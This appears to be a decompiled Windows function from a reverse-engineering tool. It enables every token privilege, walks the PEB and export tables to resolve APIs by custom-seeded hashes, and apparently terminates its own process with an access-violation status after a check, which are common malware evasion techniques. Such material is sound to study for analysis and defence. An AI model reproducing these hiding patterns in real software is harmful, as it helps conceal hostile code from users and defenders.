
undefined1 FUN_1400ee6d0(undefined8 *param_1)

{
  HANDLE TokenHandle;
  undefined1 uVar1;
  BOOL BVar2;
  LUID *_Memory;
  ulonglong uVar3;
  ulonglong uVar4;
  uint uVar5;
  ulonglong uVar6;
  char *pcVar7;
  char cVar8;
  longlong lVar9;
  undefined1 auVar10 [64];
  _TOKEN_PRIVILEGES local_78;
  HANDLE local_68;
  undefined8 local_60;
  
  local_60 = 0xfffffffffffffffe;
  NtWorkerFactoryWorkerReady(*param_1);
  OpenProcessToken((HANDLE)0xffffffffffffffff,0xf01ff,&local_68);
  TokenHandle = local_68;
  lVar9 = 0;
  auVar10 = ZEXT1264(ZEXT812(0));
  do {
    _Memory = operator_new(0xc);
    _Memory->LowPart = (DWORD)lVar9;
    *(undefined8 *)&_Memory->HighPart = 0x200000000;
    local_78.PrivilegeCount = 1;
    local_78.Privileges[0].Luid = *_Memory;
    local_78.Privileges[0].Attributes = 2;
    BVar2 = AdjustTokenPrivileges(TokenHandle,0,&local_78,0x10,auVar10._0_8_,auVar10._8_8_);
    if (BVar2 != 0) {
      GetLastError();
    }
    free(_Memory);
    lVar9 = lVar9 + 1;
  } while (lVar9 != 0x40);
  if (1 < (longlong)local_68 + 1U) {
    local_68 = (HANDLE)0x0;
    NtClose();
  }
  local_78.PrivilegeCount = 0;
  uVar3 = 0;
  lVar9 = readgsbase();
  lVar9 = *(longlong *)
           (**(longlong **)(*(longlong *)(*(longlong *)(lVar9 + 0x60) + 0x18) + 0x10) + 0x30);
  uVar4 = (ulonglong)*(uint *)(lVar9 + 0x88 + (longlong)*(int *)(lVar9 + 0x3c));
  do {
    uVar6 = (ulonglong)*(uint *)((ulonglong)*(uint *)(lVar9 + 0x20 + uVar4) + lVar9 + uVar3 * 4);
    cVar8 = *(char *)(lVar9 + uVar6);
    if (cVar8 != '\0') {
      pcVar7 = (char *)(uVar6 + lVar9 + 1);
      uVar5 = 0x76ee053a;
      do {
        uVar5 = ((int)cVar8 ^ uVar5) * 0x1000193;
        cVar8 = *pcVar7;
        pcVar7 = pcVar7 + 1;
      } while (cVar8 != '\0');
      if (uVar5 == 0x2dda5d4e) {
        uVar1 = (*(code *)((ulonglong)
                           *(uint *)((ulonglong)*(uint *)(lVar9 + 0x1c + uVar4) + lVar9 +
                                    (ulonglong)
                                    *(ushort *)
                                     ((ulonglong)*(uint *)(lVar9 + 0x24 + uVar4) + lVar9 +
                                     (uVar3 & 0xffffffff) * 2) * 4) + lVar9))
                          (DAT_14012aca0,0x23,&local_78,4,0);
        if (local_78.PrivilegeCount == 0) {
          return uVar1;
        }
        uVar3 = 0;
        lVar9 = readgsbase();
        lVar9 = *(longlong *)
                 (**(longlong **)(*(longlong *)(*(longlong *)(lVar9 + 0x60) + 0x18) + 0x10) + 0x30);
        uVar4 = (ulonglong)*(uint *)(lVar9 + 0x88 + (longlong)*(int *)(lVar9 + 0x3c));
        do {
          uVar6 = (ulonglong)
                  *(uint *)((ulonglong)*(uint *)(lVar9 + 0x20 + uVar4) + lVar9 + uVar3 * 4);
          cVar8 = *(char *)(lVar9 + uVar6);
          if (cVar8 != '\0') {
            pcVar7 = (char *)(uVar6 + lVar9 + 1);
            uVar5 = 0x90ece12b;
            do {
              uVar5 = ((int)cVar8 ^ uVar5) * 0x1000193;
              cVar8 = *pcVar7;
              pcVar7 = pcVar7 + 1;
            } while (cVar8 != '\0');
            if (uVar5 == 0xc2996103) {
              (*(code *)((ulonglong)
                         *(uint *)((ulonglong)*(uint *)(lVar9 + 0x1c + uVar4) + lVar9 +
                                  (ulonglong)
                                  *(ushort *)
                                   ((ulonglong)*(uint *)(lVar9 + 0x24 + uVar4) + lVar9 +
                                   (uVar3 & 0xffffffff) * 2) * 4) + lVar9))
                        (0xffffffffffffffff,0xc0000005);
              LOCK();
              UNLOCK();
              uVar1 = DAT_14012b201;
              DAT_14012b201 = 1;
              return uVar1;
            }
          }
          uVar3 = uVar3 + 1;
        } while( true );
      }
    }
    uVar3 = uVar3 + 1;
  } while( true );
}

